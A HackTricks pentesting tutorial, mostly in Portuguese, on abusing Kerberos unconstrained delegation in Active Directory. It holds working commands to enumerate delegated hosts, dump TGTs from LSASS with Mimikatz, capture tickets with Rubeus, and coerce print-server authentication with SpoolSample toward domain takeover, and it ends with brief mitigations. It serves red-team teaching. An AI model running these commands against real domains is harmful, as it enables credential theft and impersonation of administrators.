# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Esta é uma funcionalidade que um Administrador de Domínio pode definir para qualquer **Computador** dentro do domínio. Assim, sempre que um **usuário fizer login** no Computador, uma **cópia do TGT** desse usuário será **enviada dentro do TGS** fornecido pelo DC **e salva na memória no LSASS**. Portanto, se você tiver privilégios de Administrador na máquina, poderá **extrair os tickets e se passar pelos usuários** em qualquer máquina.

Assim, se um administrador de domínio fizer login em um Computador com a funcionalidade "Unconstrained Delegation" ativada, e você tiver privilégios de administrador local nessa máquina, poderá extrair o ticket e se passar pelo Administrador de Domínio em qualquer lugar (privesc de domínio).

Você pode **encontrar objetos de Computador com esse atributo** verificando se o atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contém [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Você pode fazer isso com um filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que é o que o powerview faz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carregue o ticket do Administrador (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Mais informações sobre delegação não restrita em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forçar Autenticação**

Se um atacante conseguir **comprometer um computador permitido para "Delegação Não Restrita"**, ele poderia **enganar** um **servidor de impressão** para **fazer login automaticamente** contra ele **salvando um TGT** na memória do servidor.\
Então, o atacante poderia realizar um **ataque Pass the Ticket para se passar** pela conta de computador do usuário do servidor de impressão.

Para fazer um servidor de impressão fazer login contra qualquer máquina, você pode usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se o TGT for de um controlador de domínio, você pode realizar um [**ataque DCSync**](acl-persistence-abuse/index.html#dcsync) e obter todos os hashes do DC.\
[**Mais informações sobre este ataque em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Encontre aqui outras maneiras de **forçar uma autenticação:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigação

- Limitar logins de DA/Admin a serviços específicos
- Definir "Conta é sensível e não pode ser delegada" para contas privilegiadas.

{{#include ../../banners/hacktricks-training.md}}
